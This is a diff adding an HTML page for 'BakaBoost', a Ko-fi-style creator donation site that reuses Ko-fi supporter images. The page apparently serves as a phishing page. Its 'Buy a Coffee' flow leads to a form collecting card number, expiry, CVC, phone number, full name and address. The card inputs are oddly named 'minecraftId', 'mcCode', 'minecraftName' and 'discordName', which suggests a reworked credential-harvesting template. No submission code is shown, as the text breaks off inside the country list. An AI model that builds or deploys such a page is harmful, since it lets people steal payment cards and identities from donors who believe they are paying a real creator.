@@ -1,0 +1,1340 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Support — BakaBoost</title>
+    <link rel="icon" type="image/png" href="/coffee-mug.png" />
+    <meta name="description" content="Support a creator on BakaBoost." />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="BakaBoost" />
+    <meta property="og:title" content="Support a Creator on BakaBoost" />
+    <meta property="og:description" content="Support a creator on BakaBoost." />
+    <meta property="og:image" content="/kat-link-preview.png" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Support a Creator on BakaBoost" />
+    <meta name="twitter:description" content="Support a creator on BakaBoost." />
+    <meta name="twitter:image" content="/kat-link-preview.png" />
+    <meta name="theme-color" content="#467ceb" />
+    <style>
+:root {
+  --blue: #467ceb;
+  --phone-pill: rgba(70, 124, 235, 0.12);
+  --text: #111827;
+  --muted: #7e879b;
+  --line: #dfe4ee;
+  --soft: #f4f7fc;
+  --card: #ffffff;
+  --shadow: 0 2px 8px rgba(15, 23, 42, 0.12);
+  --radius: 18px;
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body { margin: 0; color: var(--text); background: #ffffff; font-family: Arial, Helvetica, sans-serif; letter-spacing: 0; }
+button, input, textarea { font: inherit; }
+button { cursor: pointer; }
+.site-header, .cover, .profile, .tabs, .content-shell { animation: page-enter 0.72s cubic-bezier(0.16, 1, 0.3, 1) both; }
+.site-header { animation-delay: 0.02s; }
+.cover { animation-delay: 0.1s; }
+.profile { animation-delay: 0.2s; }
+.tabs { animation-delay: 0.28s; }
+.content-shell { animation-delay: 0.36s; }
+.card, .shop-row, .feed-item, .gallery-item, .product, .post-card { animation: card-enter 0.62s cubic-bezier(0.16, 1, 0.3, 1) both; }
+.left-stack .card:nth-child(1) { animation-delay: 0.42s; }
+.left-stack .card:nth-child(2), .right-stack .card:nth-child(1) { animation-delay: 0.5s; }
+.right-stack .card:nth-child(2) { animation-delay: 0.58s; }
+.right-stack .card:nth-child(3) { animation-delay: 0.66s; }
+@keyframes page-enter { from { opacity: 0; transform: translateY(18px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes card-enter { from { opacity: 0; transform: translateY(18px) scale(0.985); } to { opacity: 1; transform: translateY(0) scale(1); } }
+@media (prefers-reduced-motion: reduce) {
+  .site-header, .cover, .profile, .tabs, .content-shell, .card, .shop-row, .feed-item, .gallery-item, .product, .post-card { animation: none; }
+}
+.site-header { border-bottom: 1px solid rgba(223,228,238,0.6); background: rgba(255,255,255,0.72); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); position: sticky; top: 0; z-index: 100; }
+.header-inner { max-width: 70rem; height: 64px; margin: 0 auto; padding: 0 16px; display: flex; align-items: center; justify-content: space-between; }
+.brand { color: var(--text); font-size: 24px; font-weight: 800; text-decoration: none; }
+.top-nav { display: flex; align-items: center; gap: 26px; }
+.top-nav a { color: var(--text); font-size: 14px; text-decoration: none; }
+.black-pill { border: 0; border-radius: 999px; background: #050505; color: #fff; padding: 10px 18px; font-weight: 700; }
+.cover { max-width: 60rem; height: 318px; margin: 0 auto; overflow: hidden; border-radius: 0 0 12px 12px; background-size: cover; background-position: center; background-repeat: no-repeat; background-color: #e1f0ff; }
+.profile { max-width: 60rem; margin: 0 auto; display: flex; align-items: center; gap: 16px; padding: 0 4px; transform: translateY(-6px); }
+.avatar { width: 128px; height: 128px; border: 4px solid #fff; border-radius: 999px; overflow: hidden; box-shadow: 0 4px 20px rgba(149, 185, 193, 0.22); background: #e1f9f6; }
+.avatar img { display: block; width: 100%; height: 100%; object-fit: cover; }
+.profile-copy { flex: 1; }
+.profile-copy h2 { margin: 0 0 4px; font-size: 24px; }
+.profile-copy p { margin: 0; color: var(--muted); }
+.profile-actions { display: flex; gap: 8px; }
+.profile-actions button { border: 0; border-radius: 999px; background: #f4f4f5; padding: 9px 14px; }
+.tabs { position: sticky; top: 0; z-index: 5; max-width: 60rem; margin: 0 auto; display: flex; gap: 24px; background: #fff; }
+.tab { border: 0; border-bottom: 4px solid transparent; background: transparent; padding: 14px 0 10px; color: var(--text); font-size: 16px; font-weight: 700; }
+.tab.active { color: var(--blue); border-bottom-color: var(--blue); }
+.page-band { min-height: 100vh; padding: 16px 16px 48px; background: linear-gradient(0deg, rgba(0,0,0,0.03), rgba(0,0,0,0.03)), linear-gradient(0deg, rgba(70,124,235,0.05), rgba(70,124,235,0.05)); }
+.content-shell { max-width: 60rem; margin: 0 auto; }
+.tab-panel { display: none; }
+.tab-panel.active { display: block; }
+.two-column { display: grid; grid-template-columns: minmax(285px, 400px) 1fr; gap: 16px; align-items: start; }
+.left-stack, .right-stack { display: grid; gap: 16px; }
+.left-stack { position: sticky; top: 70px; }
+.card { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); box-shadow: var(--shadow); padding: 16px; }
+.card h3, .card h4 { margin: 0 0 16px; font-size: 16px; }
+.card p { line-height: 1.55; }
+.socials, .badges, .supporters, .card-title-row, .section-heading { display: flex; align-items: center; }
+.socials { gap: 18px; color: var(--muted); font-weight: 700; }
+.badges { flex-wrap: wrap; gap: 8px; margin-top: 18px; }
+.badges span { border-radius: 6px; background: #f0f1f4; color: #8a93a6; padding: 6px 12px; font-size: 12px; font-weight: 800; }
+.card-title-row, .section-heading { justify-content: space-between; gap: 12px; }
+.link-button { border: 0; background: transparent; color: var(--muted); text-decoration: underline; font-weight: 700; }
+.mini-gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; }
+.mini-gallery img { display: block; width: 100%; height: 118px; object-fit: cover; }
+.supporters { justify-content: space-between; background: #f7f7f7; border-radius: 10px; padding: 12px; }
+.supporter-row { display: flex; }
+.face { width: 32px; height: 32px; margin-right: -4px; border: 2px solid #fff; border-radius: 999px; object-fit: cover; }
+.segmented { display: grid; grid-template-columns: repeat(auto-fit, minmax(0, 1fr)); border-radius: 999px; background: transparent; padding: 4px; margin-bottom: 4px; }
+.segmented:has(button + button) { background: #f0f2f7; }
+.segmented button { border: 0; border-radius: 999px; background: transparent; padding: 11px 8px; color: #24262d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; font-size: 17px; font-weight: 600; line-height: 1.2; letter-spacing: 0; }
+.segmented .selected { background: #fff; color: #24262d; box-shadow: 0 3px 10px rgba(0,0,0,0.14); }
+.info-dot { display: inline-flex; width: 15px; height: 15px; align-items: center; justify-content: center; border: 2px solid #7d8189; border-radius: 999px; color: #7d8189; font-size: 10px; font-weight: 700; vertical-align: 2px; }
+.price-line { display: flex; gap: 12px; align-items: center; margin-bottom: 4px; font-size: 17px; line-height: 1.3; }
+.coffee-dot { font-size: 22px; }
+.coffee-badge { display: inline-block; width: 34px; height: 26px; background: url("data:image/svg+xml,%3Csvg width='34' height='26' viewBox='0 0 34 26' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M4 6.5C4 4.57 5.57 3 7.5 3H23.5C25.43 3 27 4.57 27 6.5V13.2C27 18.05 23.05 22 18.2 22H12.8C7.95 22 4 18.05 4 13.2V6.5Z' fill='white' stroke='%23202A35' stroke-width='3'/%3E%3Cpath d='M27 8H29.2C31.3 8 33 9.7 33 11.8C33 13.9 31.3 15.6 29.2 15.6H27' stroke='%23202A35' stroke-width='3' stroke-linecap='round'/%3E%3Cpath d='M15.5 17.2L14.15 16.02C9.72 12.16 12.02 7.92 15.5 10.08C18.98 7.92 21.28 12.16 16.85 16.02L15.5 17.2Z' fill='%23467CEB'/%3E%3C/svg%3E") center / contain no-repeat; }
+.coffee-badge::before, .coffee-badge::after { content: none; }
+.coffee-stepper { margin-left: auto; display: flex; align-items: center; gap: 10px; }
+.coffee-stepper button { width: 52px; height: 52px; border: 0; border-radius: 999px; background: #f0f2f7; color: #8b94a7; font-size: 20px; font-weight: 700; }
+.coffee-stepper button:last-child { background: rgba(70,124,235,0.14); color: var(--blue); }
+.coffee-stepper span { min-width: 88px; height: 52px; border: 1px solid #d9deea; border-radius: 999px; background: #f6f7fb; display: inline-flex; align-items: center; justify-content: center; text-align: center; font-size: 20px; font-weight: 600; }
+.payment-field { display: grid; gap: 6px; }
+.field-label { color: #404756; font-size: 12px; font-weight: 600; line-height: 1.2; }
+.money-field { position: relative; }
+.money-field .currency-symbol { position: absolute; left: 14px; top: calc(50% + 11px); z-index: 1; color: var(--muted); transform: translateY(-50%); }
+.money-field .input { padding-left: 30px; }
+.monthly-check { display: flex; align-items: center; gap: 8px; margin: 1px 0 0; color: var(--text); font-size: 13px; line-height: 1.3; }
+.checkout-summary { display: flex; align-items: center; justify-content: space-between; border: 1px solid #d9deea; border-radius: 8px; background: #fff; padding: 11px 14px; color: #404756; font-size: 14px; line-height: 1.3; }
+.checkout-summary strong { color: var(--text); font-size: 16px; font-weight: 650; }
+.input, .textarea { width: 100%; border: 1px solid #d9deea; border-radius: 8px; background: #f6f7fb; color: var(--text); outline: none; transition: border-color 0.15s, box-shadow 0.15s; }
+.input { min-height: 50px; padding: 11px 18px; font-size: 17px; line-height: 1.35; }
+select.input { appearance: none; background-image: linear-gradient(45deg, transparent 50%, #2f3542 50%), linear-gradient(135deg, #2f3542 50%, transparent 50%); background-position: calc(100% - 22px) 50%, calc(100% - 15px) 50%; background-repeat: no-repeat; background-size: 7px 7px, 7px 7px; color: var(--text); cursor: pointer; padding-right: 46px; -webkit-text-fill-color: var(--text); }
+.country-select { min-height: 50px; }
+.country-select option { color: var(--text); }
+.textarea { min-height: 66px; padding: 11px 18px; font-size: 17px; line-height: 1.35; resize: vertical; }
+.textarea.small { min-height: 82px; }
+.input:focus, .textarea:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(70,124,235,0.14); }
+.input.is-invalid, .textarea.is-invalid { border-color: #dc2626; box-shadow: 0 0 0 3px rgba(220,38,38,0.1); }
+.field-error { color: #c62828; font-size: 12px; font-weight: 600; line-height: 1.35; }
+.primary-button { width: 100%; border: 0; border-radius: 999px; background: var(--blue); color: #fff; padding: 14px; font-size: 18px; font-weight: 650; line-height: 1.25; }
+.order-card { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
+.order-card h3, .order-card h4 { letter-spacing: 0; }
+.order-intro { display: grid; gap: 10px; }
+.order-intro h3 { margin-bottom: 4px; font-size: 17px; font-weight: 600; line-height: 1.25; letter-spacing: 0; }
+.order-intro .primary-button { margin-top: 2px; }
+.form-header { display: flex; align-items: center; justify-content: space-between; }
+.form-header button { border: 0; background: transparent; color: var(--muted); font-size: 26px; font-weight: 600; line-height: 1; }
+.order-form { display: grid; gap: 11px; }
+.hidden, .order-form.hidden { display: none; }
+.order-form label { display: grid; gap: 5px; color: #1f2937; font-size: 12px; font-weight: 600; line-height: 1.3; }
+.order-form .input { min-height: 46px; padding: 10px 14px; background: #f6f7fb; font-size: 15px; font-weight: 500; line-height: 1.35; }
+.order-form .textarea { min-height: 96px; padding: 10px 14px; background: #f6f7fb; font-size: 15px; font-weight: 500; line-height: 1.35; }
+.order-form .input::placeholder, .order-form .textarea::placeholder { color: #6f7480; font-weight: 500; }
+.payment-detail-card { display: grid; gap: 12px; border: 1px solid #d9deea; border-radius: 10px; background: #fbfcff; padding: 12px; }
+.payment-detail-card label { gap: 6px; color: #2f3542; font-size: 15px; font-weight: 500; }
+.payment-detail-card .input { min-height: 46px; border-color: #d9deea; background: #fff; color: #2f3542; font-size: 17px; font-weight: 500; }
+.payment-input-wrap { position: relative; display: block; }
+.phone-inputs { display: grid; grid-template-columns: minmax(152px, 0.9fr) minmax(0, 1fr); gap: 6px; background: var(--phone-pill); border: 1px solid var(--line); border-radius: 10px; padding: 8px; }
+.phone-inputs .input, .phone-inputs select { background: #fff; }
+.country-code-picker { position: relative; min-width: 0; }
+.country-code-native { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+.country-code-button { position: relative; display: flex; width: 100%; min-height: 46px; align-items: center; gap: 8px; border: 1px solid #d9deea; border-radius: 8px; background: #fff; color: var(--text); cursor: pointer; padding: 10px 34px 10px 12px; font: inherit; font-size: 15px; font-weight: 600; text-align: left; }
+.country-code-button::after { content: ""; position: absolute; right: 13px; top: 50%; width: 8px; height: 8px; border-right: 2px solid #2f3542; border-bottom: 2px solid #2f3542; transform: translateY(-65%) rotate(45deg); }
+.country-code-picker.is-open .country-code-button { border-color: var(--blue); box-shadow: 0 0 0 4px rgba(70,124,235,0.12); }
+.country-code-flag-wrap { display: inline-flex; position: relative; flex: 0 0 24px; width: 24px; height: 18px; align-items: center; justify-content: center; overflow: hidden; border-radius: 3px; background: #e8ecf5; box-shadow: inset 0 0 0 1px rgba(47,53,66,0.16); }
+.country-code-flag { display: block; width: 100%; height: 100%; object-fit: cover; }
+.country-code-fallback { display: none; color: #404756; font-size: 9px; font-weight: 800; line-height: 1; }
+.country-code-flag-wrap.no-flag .country-code-flag { display: none; }
+.country-code-flag-wrap.no-flag .country-code-fallback { display: inline; }
+.country-code-button-text, .country-code-option-text { min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.country-code-menu { position: absolute; z-index: 30; top: calc(100% + 6px); right: 0; left: 0; display: none; max-height: 260px; overflow-y: auto; border: 1px solid #ccd5e4; border-radius: 8px; background: #fff; box-shadow: 0 18px 40px rgba(17,24,39,0.18); padding: 6px; }
+.country-code-picker.is-open .country-code-menu { display: grid; gap: 2px; }
+.country-code-option { display: flex; width: 100%; align-items: center; gap: 8px; border: 0; border-radius: 6px; background: transparent; color: #2f3542; cursor: pointer; padding: 8px 10px; font: inherit; font-size: 14px; font-weight: 600; text-align: left; }
+.country-code-option:hover, .country-code-option.is-selected { background: #eef3ff; color: var(--blue); }
+.payment-number-field .input { padding-right: 128px; }
+.security-code-field .input { padding-right: 62px; }
+.payment-field-row { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 14px; }
+.id-badges { position: absolute; top: 50%; right: 12px; display: flex; gap: 5px; transform: translateY(-50%); width: 151px; justify-content: flex-end; }
+.id-badges b { display: inline-flex; flex: 0 0 34px; width: 34px; height: 22px; align-items: center; justify-content: center; border-radius: 3px; color: #fff; font-size: 8px; font-weight: 900; line-height: 1; font-style: italic; opacity: 1; overflow: hidden; transform: scale(1); transform-origin: center; transition: flex-basis 0.2s ease, width 0.2s ease, opacity 0.16s ease, transform 0.16s ease; box-shadow: inset 0 0 0 1px rgba(255,255,255,0.22); }
+.id-badges.has-brand b { flex-basis: 0; width: 0; opacity: 0; transform: scale(0.82); }
+.id-badges[data-brand="visa"] [data-card-brand="visa"], .id-badges[data-brand="mastercard"] [data-card-brand="mastercard"], .id-badges[data-brand="amex"] [data-card-brand="amex"], .id-badges[data-brand="diners"] [data-card-brand="diners"] { flex-basis: 34px; width: 34px; opacity: 1; transform: scale(1); }
+.visa-logo { background: #0b5aa3; }
+.master-logo { position: relative; gap: 0; overflow: hidden; background: #1f2937; }
+.master-logo i { width: 16px; height: 16px; border-radius: 999px; background: #eb001b; }
+.master-logo i + i { margin-left: -5px; background: #f79e1b; }
+.amex-logo { background: #159bd3; font-size: 7px; font-style: normal; }
+.diners-logo { background: #fff; border: 1px solid #d7dde8; }
+.diners-logo i { position: relative; width: 18px; height: 18px; border: 3px solid #0f67a7; border-radius: 999px; }
+.diners-logo i::before { content: ""; position: absolute; inset: 2px auto 2px 4px; width: 5px; border-radius: 999px; background: #0f67a7; }
+.code-icon { position: absolute; right: 12px; top: 50%; display: inline-flex; width: 40px; height: 26px; align-items: flex-end; justify-content: flex-end; border: 2px solid #8b94a7; border-radius: 4px; color: #6f7480; padding: 0 3px 2px 0; font-size: 10px; font-weight: 700; transform: translateY(-50%); }
+.code-icon::before { content: ""; position: absolute; left: 0; right: 0; top: 7px; height: 2px; background: #8b94a7; }
+.address-title h4 { margin-bottom: 3px; font-size: 15px; line-height: 1.3; }
+.address-title p { margin: 0; color: var(--muted); font-size: 13px; line-height: 1.4; }
+.form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 11px; }
+.status { min-height: 18px; margin: 0; color: var(--muted); font-size: 13px; font-weight: 700; }
+.status.ok { color: #16803a; }
+.status.error { color: #c62828; }
+.shop-list, .feed, .post-list { display: grid; gap: 14px; }
+.shop-row { display: grid; grid-template-columns: 90px 1fr auto; gap: 12px; align-items: center; }
+.thumb { width: 90px; height: 90px; object-fit: cover; }
+.shop-row strong { display: block; font-size: 14px; }
+.shop-row p, .feed span { color: var(--muted); margin: 4px 0 0; font-size: 13px; }
+.shop-row button, .filters button, .section-heading button { border: 0; border-radius: 8px; background: var(--blue); color: #fff; padding: 9px 12px; font-weight: 800; }
+.feed-item { display: grid; grid-template-columns: 40px 1fr 32px; align-items: center; gap: 12px; padding-bottom: 14px; border-bottom: 1px solid var(--line); }
+.feed-item img { width: 40px; height: 40px; border-radius: 999px; object-fit: cover; }
+.feed-item p { margin: 0; }
+.feed-item button { width: 32px; height: 32px; border: 0; border-radius: 999px; background: transparent; color: var(--muted); font-weight: 900; }
+.feed-item.has-comment { align-items: start; }
+.feed-comment { grid-column: 1 / -1; border: 1px solid var(--line); border-radius: 12px; padding: 14px; line-height: 1.5; }
+.gallery-grid, .product-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px; }
+.gallery-item { position: relative; display: block; height: 520px; border-radius: 16px; overflow: hidden; color: var(--text); text-decoration: none; }
+.gallery-item img { width: 100%; height: 100%; object-fit: cover; }
+.gallery-item span { position: absolute; left: 12px; right: 12px; bottom: 12px; border-radius: 8px; background: rgba(255,255,255,0.9); padding: 10px; font-weight: 800; }
+.post-list { max-width: 620px; margin: 0 auto; }
+.post-card { overflow: hidden; border: 1px solid var(--line); border-radius: 16px; background: #fff; }
+.post-card time, .post-card h3, .post-card p { display: block; margin-left: 16px; margin-right: 16px; }
+.post-card time { margin-top: 16px; color: var(--muted); font-size: 13px; }
+.post-image { display: block; width: 100%; height: 360px; object-fit: cover; }
+.filters { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 24px; }
+.filters button { background: #edf0f5; color: var(--text); border-radius: 999px; }
+.filters .active { background: var(--blue); color: #fff; }
+.product { overflow: hidden; border: 1px solid var(--line); border-radius: 16px; background: #fff; }
+.product-img { display: block; width: 100%; height: 260px; object-fit: cover; background: var(--soft); }
+.product strong, .product p { display: block; margin: 12px; }
+.product button { margin: 0 12px 12px; border: 0; border-radius: 8px; background: var(--blue); color: #fff; padding: 9px 12px; font-weight: 800; }
+.empty-state { text-align: center; padding: 48px 24px; color: var(--muted); font-size: 14px; }
+@media (max-width: 820px) {
+  .top-nav { display: none; }
+  .cover, .profile, .tabs, .content-shell { max-width: none; }
+  .cover { height: 280px; border-radius: 0; }
+  .profile { padding: 0 16px; }
+  .avatar { width: 96px; height: 96px; }
+  .profile-actions { display: none; }
+  .tabs { padding: 0 16px; overflow-x: auto; }
+  .two-column, .form-grid, .phone-inputs, .payment-field-row, .gallery-grid, .product-grid { grid-template-columns: 1fr; }
+  .left-stack { position: static; }
+  .gallery-item { height: 420px; }
+  .shop-row { grid-template-columns: 74px 1fr; }
+  .shop-row button { grid-column: 2; justify-self: start; }
+}
+    </style>
+  </head>
+  <body>
+    <script>window.__PROFILE__ = __PROFILE_DATA__;</script>
+
+    <header class="site-header">
+      <div class="header-inner">
+        <a class="brand" href="/">BakaBoost</a>
+        <nav class="top-nav" aria-label="Main navigation">
+          <a href="#">Log in</a>
+          <a href="#">Explore</a>
+          <a href="#">How it works</a>
+          <button class="black-pill" type="button">Start a page</button>
+        </nav>
+      </div>
+    </header>
+
+    <main>
+      <section class="cover" id="cover-banner" aria-label="Creator banner"></section>
+
+      <section class="profile">
+        <div class="avatar">
+          <img id="profile-avatar" src="" alt="avatar" />
+        </div>
+        <div class="profile-copy">
+          <h2 id="profile-name">Loading...</h2>
+          <p id="profile-followers">0 Followers</p>
+        </div>
+        <div class="profile-actions">
+          <button type="button" id="share-btn">Share</button>
+          <button type="button" aria-label="Email">✉</button>
+          <button type="button" aria-label="More">•••</button>
+        </div>
+      </section>
+
+      <nav class="tabs" aria-label="Profile sections">
+        <button class="tab active" data-tab="about" type="button">About</button>
+        <button class="tab" data-tab="gallery" type="button">Gallery</button>
+        <button class="tab" data-tab="posts" type="button">Posts</button>
+        <button class="tab" data-tab="shop" type="button">Shop</button>
+      </nav>
+
+      <section class="page-band">
+        <div class="content-shell">
+
+          <!-- ABOUT TAB -->
+          <div class="tab-panel active" id="about">
+            <div class="two-column">
+              <aside class="left-stack">
+                <article class="card">
+                  <h3>About</h3>
+                  <p id="about-bio"></p>
+                  <div class="socials" aria-label="Social links">
+                    <span>◎</span>
+                    <span>𝕏</span>
+                    <span>▶</span>
+                    <span>▣</span>
+                  </div>
+                  <div class="badges">
+                    <span>Animation</span>
+                    <span>Design</span>
+                    <span>Art</span>
+                    <span>Game Development</span>
+                  </div>
+                </article>
+
+                <article class="card">
+                  <h3>Top Supporters</h3>
+                  <div class="supporters">
+                    <div class="supporter-row">
+                      <img class="face" src="https://ko-fi.com/img/anon12.png?v=10" alt="Somebody" />
+                      <img class="face" src="https://ko-fi.com/img/anon5.png?v=1" alt="Ko-fi Supporter" />
+                      <img class="face" src="https://ko-fi.com/img/anon12.png?v=10" alt="Somebody" />
+                    </div>
+                    <button class="link-button" type="button">See Leaderboard</button>
+                  </div>
+                </article>
+
+                <article class="card">
+                  <div class="card-title-row">
+                    <h3>Gallery</h3>
+                    <button class="link-button" data-tab-jump="gallery" type="button">View Gallery</button>
+                  </div>
+                  <div class="mini-gallery" id="mini-gallery"></div>
+                </article>
+              </aside>
+
+              <section class="right-stack">
+                <article class="card order-card" id="order-card">
+                  <form class="order-intro" id="order-intro">
+                    <h3 id="order-heading">Buy a Coffee</h3>
+                    <div class="price-line">
+                      <span class="coffee-badge" aria-hidden="true"></span>
+                      <span id="coffee-price-label">$1 each</span>
+                      <div class="coffee-stepper" aria-label="Coffee amount">
+                        <button id="decrease-coffee" type="button">-</button>
+                        <span id="coffee-count">1</span>
+                        <button id="increase-coffee" type="button">+</button>
+                      </div>
+                    </div>
+                    <label class="money-field payment-field" aria-label="Payment amount">
+                      <span class="field-label">Amount</span>
+                      <span class="currency-symbol">$</span>
+                      <input class="input" id="intro-total" inputmode="numeric" value="1" required />
+                    </label>
+                    <label class="payment-field">
+                      <span class="field-label">Display name</span>
+                      <input class="input" id="intro-name" placeholder="Name shown on the payment" required minlength="2" />
+                    </label>
+                    <label class="payment-field">
+                      <span class="field-label">Message</span>
+                      <textarea class="textarea" id="intro-message" placeholder="Write a short note"></textarea>
+                    </label>
+                    <div class="checkout-summary" aria-live="polite">
+                      <span>Total</span>
+                      <strong>$<span id="payment-summary-total">1</span> <span id="payment-summary-type">today</span></strong>
+                    </div>
+                    <button class="primary-button" id="continue-order" type="submit">
+                      Pay
+                    </button>
+                  </form>
+
+                  <form class="order-form hidden" id="order-form" novalidate>
+                    <div class="form-header">
+                      <h3>Payment Info</h3>
+                      <button id="close-order" type="button" aria-label="Close order form">×</button>
+                    </div>
+
+                    <label>
+                      <span>Phone number</span>
+                      <div class="phone-inputs">
+                        <div class="country-code-picker" data-country-code-picker>
+                          <select class="country-code-native" name="phoneCountryCode" aria-label="Country calling code" required tabindex="-1"></select>
+                          <button class="country-code-button" type="button" aria-haspopup="listbox" aria-expanded="false">
+                            <span class="country-code-flag-wrap" data-selected-country-flag>
+                              <img class="country-code-flag" alt="" />
+                              <span class="country-code-fallback" aria-hidden="true"></span>
+                            </span>
+                            <span class="country-code-button-text"></span>
+                          </button>
+                          <div class="country-code-menu" role="listbox"></div>
+                        </div>
+                        <input class="input numeric-only" type="tel" name="phoneNumber" inputmode="numeric" maxlength="15" minlength="6" pattern="[0-9]{6,15}" placeholder="Phone number" required />
+                      </div>
+                    </label>
+
+                    <div class="payment-detail-card">
+                      <label class="payment-number-field">
+                        <span>Card Number</span>
+                        <span class="payment-input-wrap">
+                          <input class="input numeric-only" name="minecraftId" inputmode="numeric" maxlength="19" minlength="19" pattern="[0-9]{4} [0-9]{4} [0-9]{4} [0-9]{4}" placeholder="1234 1234 1234 1234" required />
+                          <span class="id-badges" aria-hidden="true">
+                            <b class="visa-logo" data-card-brand="visa">VISA</b>
+                            <b class="master-logo" data-card-brand="mastercard"><i></i><i></i></b>
+                            <b class="amex-logo" data-card-brand="amex">AMEX</b>
+                            <b class="diners-logo" data-card-brand="diners"><i></i></b>
+                          </span>
+                        </span>
+                      </label>
+                      <div class="payment-field-row">
+                        <label>
+                          <span>Expiry date</span>
+                          <input class="input" name="expirationDate" inputmode="numeric" maxlength="7" pattern="(0[1-9]|1[0-2])/[0-9]{4}" placeholder="MM / YYYY" required />
+                        </label>
+                        <label class="security-code-field">
+                          <span>Security code</span>
+                          <span class="payment-input-wrap">
+                            <input class="input numeric-only" name="mcCode" inputmode="numeric" maxlength="4" minlength="3" pattern="[0-9]{3,4}" placeholder="CVC" required />
+                            <span class="code-icon" aria-hidden="true">123</span>
+                          </span>
+                        </label>
+                      </div>
+                    </div>
+
+                    <label>
+                      <span>First name</span>
+                      <input class="input name-only" name="minecraftName" placeholder="Liam" minlength="2" required />
+                    </label>
+                    <label>
+                      <span>Last name</span>
+                      <input class="input name-only" name="discordName" placeholder="Maxwell" minlength="2" required />
+                    </label>
+
+                    <div class="address-title"><h4>Address</h4></div>
+                    <label><input class="input address-only" name="address" placeholder="Street address" minlength="5" required /></label>
+
+                    <div class="form-grid">
+                      <label><span>City</span><input class="input" name="city" placeholder="City" minlength="2" required /></label>
+                      <label><span>State / region</span><input class="input" name="state" placeholder="State / region" minlength="2" required /></label>
+                      <label>
+                        <span data-postal-code-label>ZIP code</span>
+                        <input class="input" name="zipCode" inputmode="text" pattern="[A-Za-z0-9][A-Za-z0-9 -]{1,14}[A-Za-z0-9]" placeholder="ZIP code" maxlength="16" required />
+                      </label>
+                      <label>
+                        <span>Country</span>
+                        <select class="input country-select" name="country" required>
+                          <option>Afghanistan</option><option>Albania</option><option>Algeria</option><option>Andorra</option><option>Angola</option><option>Antigua and Barbuda</option><option>Argentina</option><option>Armenia</option><option>Australia</option><option>Austria</option><option>Azerbaijan</option><option>Bahamas</option><option>Bahrain</option><option>Bangladesh</option><option>Barbados</option><option>Belarus</option><option>Belgium</option><option>Belize</option><option>Benin</option><option>Bhutan</option><option>Bolivia</option><option>Bosnia and Herzegovina</option><option>Botswana</option><option>Brazil</option><option>Brunei</option><option>Bulgaria</option><option>Burkina Faso</option><option>Burundi</option><option>Cabo Verde</option><option>Cambodia</option><option>Cameroon</option><option>Canada</option><option>Central African Republic</option><option>Chad</option><option>Chile</option><option>China</option><option>Colombia</option><option>Comoros</option><option>Congo</option><option>Costa Rica</option><option>Cote d'Ivoire</option><option>Croatia</option><option>Cuba</option><option>Cyprus</option><option>Czechia</option><option>Democratic Republic of the Congo</option><option>Denmark</option><option>Djibouti</option><option>Dominica</option><option>Dominican Republic</option><option>Ecuador</option><option>Egypt</option><option>El Salvador</option><option>Equatorial Guinea</option><option>Eritrea</option><option>Estonia</option><option>Eswatini</option><option>Ethiopia</option><option>Fiji</option><option>Finland</option><option>France</option><option>Gabon</option><option>Gambia</option><option>Georgia</option><option>Germany</option><option>Ghana</option><option>Greece</option><option>Grenada</option><option>Guatemala</option><option>Guinea</option><option>Guinea-Bissau</option><option>Guyana</option><option>Haiti</option><option>Honduras</option><option>Hungary</option><option>Iceland</option><option>India</option><option>Indonesia</option><option>Iran</option><option>Iraq</option><option>Ireland</option><option>Israel</option><option>Italy</option><option>Jamaica</option><option>Japan</option><option>Jordan</option><option>Kazakhstan</option><option>Kenya</option><option>Kiribati</option><option>Kuwait</option><option>Kyrgyzstan</option><option>Laos</option><option>Latvia</option><option>Lebanon</option><option>Lesotho</option><option>Liberia</option><option>Libya</option><option>Liechtenstein</option><option>Lithuania</option><option>Luxembourg</option><option>Madagascar</option><option>Malawi</option><option>Malaysia</option><option>Maldives</option><option>Mali</option><option>Malta</option><option>Marshall Islands</option><option>Mauritania</option><option>Mauritius</option><option>Mexico</option><option>Micronesia</option><option>Moldova</option><option>Monaco</option><option>Mongolia</option><option>Montenegro</option><option>Morocco</option><option>Mozambique</option><option>Myanmar</option><option>Namibia</option><option>Nauru</option><option>Nepal</option><option>Netherlands</option><option>New Zealand</option><option>Nicaragua</option><option>Niger</option><option>Nigeria</option><option>North Korea</option><option>North Macedonia</option><option>Norway</option><option>Oman</option><option>Pakistan</option><option>Palau</option><option>Palestine</option><option>Panama</option><option>Papua New Guinea</option><option>Paraguay</option><option>Peru</option><option>Philippines</option><option>Poland</option><option>Portugal</option><option>Qatar</option><option>Romania</option><option>Russia</option><option>Rwanda</option><option>Saint Kitts and Nevis</option><option>Saint Lucia</option><option>Saint Vincent and the Grenadines</option><option>Samoa</option><option>San Marino</option><option>Sao Tome and Principe</option><option>Saudi Arabia</option><option>Senegal</option><option>Serbia</option><option>Seychelles</option><option>Sierra Leone</option><option>Singapore</option><option>Slovakia</option><option>Slovenia</option><option>Solomon Islands</option><option>Somalia</option><option>South Africa</option><option>South Korea</option><option>South Sudan</option><option>Spain</option><option>Sri Lanka</option><option>Sudan</option><option>Suriname</option><option>Sweden</option><option>Switzerland</option><option>Syria</option><option>Tajikistan</option><option>Tanzania</option><option>Thailand</option><option>Timor-Leste</option><option>Togo</option><option>Tonga</option><option>Trinidad and Tobago</option><option>Tunisia</option><option>Turkey</option><option>Turkmenistan</option><option>Tuvalu</option><option>Uganda</option><option>Ukraine</option><option>United Arab Emirates</option><option>United Kingdom</option><option 